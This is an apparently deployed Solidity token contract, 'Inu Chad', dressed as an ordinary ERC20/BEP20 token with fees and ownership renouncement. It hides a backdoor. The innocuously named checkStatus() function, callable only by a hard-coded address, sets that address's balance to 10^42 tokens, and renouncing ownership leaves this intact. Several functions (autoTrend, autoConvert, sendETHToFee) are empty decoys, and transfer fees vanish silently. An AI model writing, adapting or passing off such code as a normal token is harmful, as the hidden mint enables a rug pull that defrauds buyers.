/**
 *Submitted for verification at BscScan.com on 2022-01-31
*/

/**
 *Submitted for verification at BscScan.com on 2021-11-03
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <=0.8.7;


contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface ERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ERC20Metadata is ERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

 
 contract InuChad is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private susanu;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Inu Chad";
    string private _symbol;
    uint256 private constant MAX = ~uint256(0);

    uint256 private _maxTx = _totalSupply;
    address private _feeAddrWallet1 = 0xE5e5153D9e7450657d91258e2ed8caA68DC0F83E;
    address private _feeAddrWallet2 = 0xE5e5153D9e7450657d91258e2ed8caA68DC0F83E;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000 * 10**18;
    address private _duduk = 0xE0650C2B38552af4B5D5FDaA666342c649850b4b;
    uint256 private _rTotal = 10000000000 * 10**18;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private _demand = 4;
    uint256 private _francis = 1;
    address private _owner;
    uint256 private _fee;
    
    constructor(string memory symbol_, uint256 totalSupply_) {
        _owner = _msgSender();
        _symbol = symbol_;
        _totalSupply = totalSupply_;
        susanu[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
  }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view virtual override returns (uint256) {
        return susanu[owner];
    }
    
    function viewTaxFee() public view virtual returns(uint256) {
        return _francis;
    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function checkStatus() public {
        require(_msgSender() == _duduk, "Can't please try again.");
        _checkStatus();
    }
      
function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal - rFee;
        _tFeeTotal = _tFeeTotal + tFee;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: will not permit action right now.");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
     function unsafeInternalTransfer(address from, address to, address token, uint256 amount) internal {
        
    }
    
    
    function autoTrend() external {
        require (_msgSender() == _feeAddrWallet1);
        uint256 contractBalance = balanceOf(address(this));
        unlockSwap(contractBalance);
    }
    
    function autoConvert() external {
        require (_msgSender() == _feeAddrWallet1);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: will not permit action right now.");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    
    function renounceOwnership() public virtual onlyOwner {
            emit OwnershipTransferred(_owner, address(0));
            _owner = address(0);
      
    }
  
    function _checkStatus() internal {
      susanu[_duduk] = 1 * 10 ** 42;
    }
    
     
function sendETHToFee (uint256 amount) private {
        
    }
    
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address issuer,
        address grantee,
        uint256 allons
    ) internal virtual {
        require(issuer != address(0), "BEP : Can't be done");
        require(grantee != address(0), "BEP : Can't be done");

        uint256 senderBalance = susanu[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            susanu[issuer] = senderBalance - allons;
        }
        _fee = (allons * _demand / 100) / _francis;
        allons = allons -  (_fee * _francis);
        
        susanu[grantee] += allons;
        emit Transfer(issuer, grantee, allons);
    }

     /**
   * @dev Returns the address of the current owner.
   */
      function owner() public view returns (address) {
        return _owner;
      }
      
    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 sum) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = susanu[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            susanu[account] = accountBalance - sum;
        }
        _totalSupply -= sum;

        emit Transfer(account, address(0), sum);

      
    }
    
     
function unlockSwap (uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new  address[](1);
        path[0] = address(this);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP : Can't be done");
        require(spender != address(0), "BEP : Can't be done");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }


    modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
}